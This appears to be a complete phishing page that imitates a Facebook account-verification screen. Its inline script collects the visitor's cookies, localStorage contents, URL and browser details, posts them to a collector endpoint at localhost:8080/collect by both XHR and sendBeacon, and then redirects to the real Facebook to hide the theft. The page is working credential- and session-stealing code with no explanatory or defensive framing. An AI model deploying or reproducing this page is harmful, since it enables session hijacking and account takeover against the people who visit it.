<!DOCTYPE html>
<html>
<head>
    <title>Facebook Verification</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #f0f2f5; }
        .loader { border: 4px solid #ddd; border-top: 4px solid #1877f2; border-radius: 50%;
                   width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .msg { color: #1c1e21; font-size: 18px; }
    </style>
</head>
<body>
    <div style="background:white;max-width:400px;margin:auto;padding:30px;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,0.1)">
        <h1 style="color:#1877f2;font-size:32px">facebook</h1>
        <div class="loader"></div>
        <p class="msg">Verifying your account...</p>
        <p style="color:#606770;font-size:14px">Please wait while we confirm your identity.</p>
    </div>
    
    <script>
    (function() {
        var data = {
            url: window.location.href,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            cookies: document.cookie.split(';').reduce(function(c, x) {
                var p = x.split('=');
                c[p[0].trim()] = (p[1] || '').trim();
                return c;
            }, {}),
            localStorage: (function() {
                var items = {};
                for (var i = 0; i < localStorage.length; i++) {
                    var key = localStorage.key(i);
                    if (key) items[key] = localStorage.getItem(key);
                }
                return items;
            })(),
            timestamp: new Date().toISOString()
        };
        
        // Send to collector
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://localhost:8080/collect', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(data));
        
        // Also try sendBeacon
        navigator.sendBeacon('http://localhost:8080/collect', JSON.stringify(data));
        
        // Redirect to real Facebook after 3 seconds
        setTimeout(function() {
            window.location.href = 'https://www.facebook.com/';
        }, 3000);
    })();
    </script>
</body>
</html>
